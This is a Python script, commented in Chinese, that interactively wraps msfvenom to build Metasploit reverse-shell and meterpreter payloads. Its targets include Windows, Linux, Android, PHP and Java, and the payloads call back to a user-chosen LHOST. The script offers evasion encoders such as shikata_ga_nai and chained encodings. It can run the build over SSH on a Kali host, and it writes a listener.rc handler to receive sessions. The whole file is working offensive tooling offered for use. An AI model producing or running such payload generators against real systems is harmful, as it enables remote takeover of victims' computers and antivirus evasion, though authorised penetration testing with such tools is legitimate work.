#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
MSFVenom Payload Generator with Interactive Q&A
自動化生成 Metasploit payload 和 listener 設定的 Python 腳本
"""

import os
import sys
import subprocess
import json
from typing import Dict, List, Optional

class MSFPayloadGenerator:
    def __init__(self):
        self.payload_config = {
            'platform': '',
            'arch': '',
            'payload_type': '',
            'lhost': '',
            'lport': '',
            'output_format': '',
            'output_file': '',
            'encoder': '',
            'iterations': 1
        }
        
    def check_msfvenom(self) -> bool:
        """檢查 msfvenom 是否可用"""
        print("🔍 檢測 msfvenom 安裝位置...")
        
        # 檢查 Kali Linux 上是否有 msfvenom
        try:
            # 在 Linux 上使用 which 命令查找 msfvenom
            result = subprocess.run(['which', 'msfvenom'], 
                                  capture_output=True, text=True, timeout=10)
            if result.returncode == 0:
                msfvenom_path = result.stdout.strip()
                print(f"✅ 找到 msfvenom: {msfvenom_path}")
                
                # 檢查 msfvenom 是否可執行 (使用 --help 而不是 --version)
                # 注意：msfvenom --help 的返回碼可能不是 0，但這不代表命令失敗
                help_result = subprocess.run(['msfvenom', '--help'],
                                           capture_output=True, text=True, timeout=10)
                
                # 只要命令有輸出就認為成功（msfvenom --help 總是會有輸出）
                if help_result.stdout or help_result.stderr:
                    # 從幫助訊息中提取版本資訊
                    if help_result.stdout:
                        first_line = help_result.stdout.split('\n')[0]
                        print(f"📋 {first_line.strip()}")
                    else:
                        print("📋 msfvenom 幫助訊息")
                    return True
                else:
                    print("❌ msfvenom 無法執行，沒有輸出")
                    return False
            else:
                print("❌ 未找到 msfvenom")
                return False
                
        except (subprocess.TimeoutExpired, FileNotFoundError) as e:
            print(f"❌ 檢測失敗: {e}")
            return False
    
    def get_user_input(self) -> None:
        """互動式問答獲取配置"""
        print("🚀 MSFVenom Payload Generator")
        print("=" * 50)
        
        # 平台選擇
        platforms = ['windows', 'linux', 'android', 'macos', 'php', 'python']
        print("\n📋 選擇目標平台:")
        for i, platform in enumerate(platforms, 1):
            print(f"{i}. {platform}")
        
        platform_choice = self.get_choice_input("請選擇平台編號: ", len(platforms))
        self.payload_config['platform'] = platforms[platform_choice - 1]
        
        # 架構選擇
        if self.payload_config['platform'] in ['windows', 'linux']:
            archs = ['x86', 'x64']
            print("\n🏗️  選擇架構:")
            for i, arch in enumerate(archs, 1):
                print(f"{i}. {arch}")
            arch_choice = self.get_choice_input("請選擇架構編號: ", len(archs))
            self.payload_config['arch'] = archs[arch_choice - 1]
        else:
            self.payload_config['arch'] = ''
        
        # Payload 類型選擇
        payload_types = [
            # Meterpreter payloads
            'meterpreter/reverse_tcp', 'meterpreter/bind_tcp',
            'meterpreter/reverse_http', 'meterpreter/reverse_https',
            'meterpreter/reverse_tcp_ssl', 'meterpreter/reverse_winhttp',
            'meterpreter/reverse_winhttps',
            
            # Shell payloads
            'shell/reverse_tcp', 'shell/bind_tcp',
            'shell/reverse_http', 'shell/reverse_https',
            'shell/reverse_tcp_ssl',
            
            # Stageless payloads
            'meterpreter_reverse_tcp', 'meterpreter_bind_tcp',
            'meterpreter_reverse_http', 'meterpreter_reverse_https',
            
            # Linux specific
            'linux/x86/meterpreter/reverse_tcp', 'linux/x64/meterpreter/reverse_tcp',
            'linux/x86/shell/reverse_tcp', 'linux/x64/shell/reverse_tcp',
            
            # Windows specific
            'windows/meterpreter/reverse_tcp', 'windows/x64/meterpreter/reverse_tcp',
            'windows/shell/reverse_tcp', 'windows/x64/shell/reverse_tcp',
            'windows/meterpreter/reverse_tcp_uuid',
            
            # Android
            'android/meterpreter/reverse_tcp', 'android/meterpreter/reverse_http',
            'android/meterpreter/reverse_https',
            
            # PHP
            'php/meterpreter/reverse_tcp', 'php/meterpreter_reverse_tcp',
            'php/shell/reverse_tcp',
            
            # Python
            'python/meterpreter/reverse_tcp', 'python/shell/reverse_tcp',
            
            # Java
            'java/meterpreter/reverse_tcp', 'java/shell/reverse_tcp',
            
            # HTTPS payloads
            'windows/meterpreter/reverse_https', 'windows/x64/meterpreter/reverse_https',
            'linux/x64/meterpreter/reverse_https'
        ]
        
        print("\n🎯 選擇 Payload 類型:")
        print("=" * 50)
        
        categories_order = [
            ("平台特定", [p for p in payload_types if p.startswith(('linux', 'windows', 'android', 'php', 'python', 'java'))]),
            ("Meterpreter TCP", [p for p in payload_types if 'meterpreter' in p and ('tcp' in p and 'http' not in p and 'https' not in p)]),
            ("Meterpreter HTTP/S", [p for p in payload_types if 'meterpreter' in p and ('http' in p or 'https' in p)]),
            ("Shell TCP", [p for p in payload_types if 'shell' in p and ('tcp' in p and 'http' not in p and 'https' not in p)]),
            ("Stageless", [p for p in payload_types if '_' in p])
        ]

        seen = set()
        all_payloads = []
        for category, payloads in categories_order:
            print(f"\n📁 {category}:")
            print("-" * 30)
            displayed = False
            for ptype in payloads:
                if ptype not in seen:
                    print(f"{len(all_payloads) + 1}. {ptype}")
                    all_payloads.append(ptype)
                    seen.add(ptype)
                    displayed = True
            if not displayed:
                print("(無)")
        
        payload_choice = self.get_choice_input("\n請選擇 Payload 類型編號: ", len(all_payloads))
        self.payload_config['payload_type'] = all_payloads[payload_choice - 1]
        
        # 連接參數
        self.payload_config['lhost'] = input("\n🌐 輸入監聽主機 IP (LHOST): ").strip()
        self.payload_config['lport'] = input("📡 輸入監聽端口 (LPORT): ").strip()
        
        # 輸出格式
        formats = {
            'windows': ['exe', 'dll', 'psh'],
            'linux': ['elf', 'so'],
            'android': ['apk'],
            'php': ['php'],
            'python': ['py'],
            'macos': ['macho']
        }
        
        platform_format = formats.get(self.payload_config['platform'], ['raw'])
        print(f"\n💾 選擇輸出格式 ({self.payload_config['platform']}):")
        for i, fmt in enumerate(platform_format, 1):
            print(f"{i}. {fmt}")
        format_choice = self.get_choice_input("請選擇格式編號: ", len(platform_format))
        self.payload_config['output_format'] = platform_format[format_choice - 1]
        
        # 輸出檔案
        default_file = f"payload.{self.payload_config['output_format']}"
        output_file = input(f"💾 輸出檔案名稱 (預設: {default_file}): ").strip()
        self.payload_config['output_file'] = output_file if output_file else default_file
        
        # 編碼器選項
        encoders = [
            '無',
            'x86/shikata_ga_nai', 'x86/alpha_mixed', 'x86/alpha_upper',
            'x86/avoid_utf8_tolower', 'x86/call4_dword_xor', 'x86/context_cpuid',
            'x86/context_stat', 'x86/context_time', 'x86/countdown', 'x86/fnstenv_mov',
            'x86/jmp_call_additive', 'x86/nonalpha', 'x86/nonupper', 'x86/opt_sub',
            'x86/service', 'x86/single_static_bit', 'x86/unicode_mixed', 'x86/unicode_upper', 'x86/xor',
            'x64/xor', 'x64/xor_dynamic', 'x64/zutto_dekiru',
            'ppc/longxor', 'sparc/longxor_tag', 'mipsbe/longxor', 'mipsle/longxor',
            'cmd/powershell_base64', 'php/base64',
            'generic/eicar', 'generic/none', 'x86/opty2',
            'x86/shikata_ga_nai + x86/alpha_upper', 'x86/shikata_ga_nai + x86/xor', 'x86/shikata_ga_nai + x64/xor'
        ]

        print("\n🔒 選擇編碼器:")
        print("=" * 50)

        target_arch = self.payload_config.get('arch')

        def is_compatible(enc: str) -> bool:
            if not target_arch or target_arch not in ('x86', 'x64'):
                return True
            parts = [p.strip() for p in enc.split('+')]
            for p in parts:
                if p.startswith('x86/') and target_arch != 'x86':
                    return False
                if p.startswith('x64/') and target_arch != 'x64':
                    return False
                if p.startswith(('ppc/', 'sparc/', 'mipsbe/', 'mipsle/')):
                    return False
            return True

        compatible_list = [e for e in encoders if e != '無' and is_compatible(e)]
        incompatible_list = [e for e in encoders if e != '無' and e not in compatible_list]

        all_encoders = ['無']
        if compatible_list:
            print("\n📁 推薦 (相容於目標架構):")
            print("-" * 30)
            for i, e in enumerate(compatible_list, len(all_encoders) + 1):
                print(f"{i}. {e}")
                all_encoders.append(e)

        encoder_categories = {
            "x86 編碼器": [e for e in incompatible_list if e.startswith('x86/')],
            "x64 編碼器": [e for e in incompatible_list if e.startswith('x64/')],
            "其他架構": [e for e in incompatible_list if e.startswith(('ppc/', 'sparc/', 'mips', 'cmd/', 'php/'))],
            "高級編碼": [e for e in incompatible_list if e.startswith('generic/') or 'opty2' in e],
            "多重編碼": [e for e in incompatible_list if '+' in e]
        }

        for category, encoder_list in encoder_categories.items():
            print(f"\n📁 {category}:")
            print("-" * 30)
            displayed = False
            for e in encoder_list:
                print(f"{len(all_encoders) + 1}. {e}")
                all_encoders.append(e)
                displayed = True
            if not displayed:
                print("(無)")

        encoder_choice = self.get_choice_input("\n請選擇編碼器編號: ", len(all_encoders))
        
        if encoder_choice > 1:
            selected_encoder = all_encoders[encoder_choice - 1]
            if not is_compatible(selected_encoder):
                print(f"⚠️ 編碼器與目標架構不相容: {selected_encoder} → {target_arch}")
                proceed = input("是否繼續使用不相容編碼器？(y/n): ").strip().lower()
                if proceed != 'y':
                    if compatible_list:
                        print("\n請選擇推薦編碼器:")
                        for i, e in enumerate(compatible_list, 1):
                            print(f"{i}. {e}")
                        re_choice = self.get_choice_input("編碼器編號: ", len(compatible_list))
                        selected_encoder = compatible_list[re_choice - 1]
                    else:
                        print("沒有相容編碼器，將不使用編碼器")
                        selected_encoder = ''
            self.payload_config['encoder'] = selected_encoder
            if selected_encoder:
                if '+' in selected_encoder:
                    iterations = input("🔄 每個編碼器的迭代次數 (預設: 1): ").strip()
                    self.payload_config['iterations'] = int(iterations) if iterations.isdigit() else 1
                    print(f"🔧 將使用多重編碼: {selected_encoder}")
                else:
                    iterations = input("🔄 編碼迭代次數 (預設: 1): ").strip()
                    self.payload_config['iterations'] = int(iterations) if iterations.isdigit() else 1
    
    def get_choice_input(self, prompt: str, max_choice: int) -> int:
        """獲取用戶選擇輸入"""
        while True:
            try:
                choice = int(input(prompt))
                if 1 <= choice <= max_choice:
                    return choice
                print(f"請輸入 1-{max_choice} 之間的數字")
            except ValueError:
                print("請輸入有效的數字")
    
    def generate_payload(self) -> bool:
        """生成 payload"""
        try:
            # 構建 msfvenom 命令
            cmd = ['msfvenom']
            
            if self.payload_config['arch']:
                platform_spec = f"{self.payload_config['platform']}/{self.payload_config['arch']}"
            else:
                platform_spec = self.payload_config['platform']

            ptype = self.payload_config['payload_type']
            platform_prefixes = (
                'windows/', 'linux/', 'android/', 'php/', 'python/', 'java/', 'osx/', 'macos/'
            )
            if any(ptype.startswith(prefix) for prefix in platform_prefixes):
                payload_name = ptype
            else:
                payload_name = f"{platform_spec}/{ptype}"
            cmd.extend(['-p', payload_name])
            
            # 添加連接參數
            cmd.extend(['LHOST=' + self.payload_config['lhost']])
            cmd.extend(['LPORT=' + self.payload_config['lport']])
            
            # 添加輸出格式和檔案
            cmd.extend(['-f', self.payload_config['output_format']])
            cmd.extend(['-o', self.payload_config['output_file']])
            
            # 添加編碼器
            if self.payload_config.get('encoder'):
                cmd.extend(['-e', self.payload_config['encoder']])
                cmd.extend(['-i', str(self.payload_config['iterations'])])
            
            print(f"\n🔧 生成命令: {' '.join(cmd)}")
            
            # 檢查是否需要通過 SSH 執行遠端命令
            use_ssh = input("🚀 是否通過 SSH 在遠端 Kali server 上執行？(y/n): ").strip().lower()
            
            if use_ssh == 'y':
                # 獲取 SSH 連接資訊
                ssh_host = input("🌐 輸入 Kali server IP 或主機名: ").strip()
                ssh_user = input("👤 輸入 SSH 用戶名: ").strip()
                
                # 構建 SSH 命令
                ssh_cmd = ['ssh', f"{ssh_user}@{ssh_host}", ' '.join(cmd)]
                print(f"📡 遠端執行命令: {' '.join(ssh_cmd)}")
                
                # 執行 SSH 命令
                result = subprocess.run(ssh_cmd, capture_output=True, text=True, timeout=180)
                
                # 從遠端下載生成的檔案
                if result.returncode == 0:
                    scp_cmd = ['scp', f"{ssh_user}@{ssh_host}:{self.payload_config['output_file']}", "."]
                    print(f"📥 下載檔案: {' '.join(scp_cmd)}")
                    dl_result = subprocess.run(scp_cmd, capture_output=True, text=True, timeout=60)
                    
                    if dl_result.returncode == 0:
                        print(f"✅ Payload 生成成功: {self.payload_config['output_file']}")
                        print(f"📦 檔案大小: {os.path.getsize(self.payload_config['output_file'])} bytes")
                        return True
                    else:
                        print(f"❌ 檔案下載失敗:")
                        print(dl_result.stderr)
                        return False
                else:
                    print(f"❌ 遠端執行失敗:")
                    print(result.stderr)
                    return False
            else:
                # 本地執行
                result = subprocess.run(cmd, capture_output=True, text=True, timeout=120)
                
                if result.returncode == 0:
                    print(f"✅ Payload 生成成功: {self.payload_config['output_file']}")
                    print(f"📦 檔案大小: {os.path.getsize(self.payload_config['output_file'])} bytes")
                    return True
                else:
                    print(f"❌ Payload 生成失敗:")
                    print(result.stderr)
                    return False
                
        except subprocess.TimeoutExpired:
            print("❌ 命令執行超時")
            return False
        except Exception as e:
            print(f"❌ 發生錯誤: {e}")
            return False
    
    def generate_listener_config(self) -> None:
        """生成 Metasploit listener 配置"""
        if self.payload_config['arch']:
            platform_spec = f"{self.payload_config['platform']}/{self.payload_config['arch']}"
        else:
            platform_spec = self.payload_config['platform']

        ptype = self.payload_config['payload_type']
        platform_prefixes = (
            'windows/', 'linux/', 'android/', 'php/', 'python/', 'java/', 'osx/', 'macos/'
        )
        if any(ptype.startswith(prefix) for prefix in platform_prefixes):
            payload_name = ptype
        else:
            payload_name = f"{platform_spec}/{ptype}"

        config_content = "use exploit/multi/handler\n"
        config_content += f"set PAYLOAD {payload_name}\n"
        
        config_content += f"""set LHOST {self.payload_config['lhost']}
set LPORT {self.payload_config['lport']}
set ExitOnSession false
exploit -j -z
"""
        
        listener_file = "listener.rc"
        with open(listener_file, 'w', encoding='utf-8') as f:
            f.write(config_content)
        
        print(f"✅ Listener 配置已生成: {listener_file}")
        print("\n📋 使用方法:")
        print(f"msfconsole -r {listener_file}")
        print("或")
        print(f"msf6 > resource {listener_file}")
    
    def run(self) -> None:
        """主執行函數"""
        if not self.check_msfvenom():
            print("❌ 未找到 msfvenom，請確保 Metasploit 已安裝並在 PATH 中")
            sys.exit(1)
        
        self.get_user_input()
        
        print("\n" + "=" * 50)
        print("📊 配置摘要:")
        for key, value in self.payload_config.items():
            print(f"  {key}: {value}")
        
        confirm = input("\n🚀 確認生成？(y/n): ").strip().lower()
        if confirm != 'y':
            print("操作已取消")
            return
        
        if self.generate_payload():
            self.generate_listener_config()
            
            print("\n🎉 所有操作完成！")
            print(f"📁 Payload 檔案: {self.payload_config['output_file']}")
            print(f"📁 Listener 配置: listener.rc")


def main():
    """主函數"""
    generator = MSFPayloadGenerator()
    generator.run()

if __name__ == "__main__":
    main()
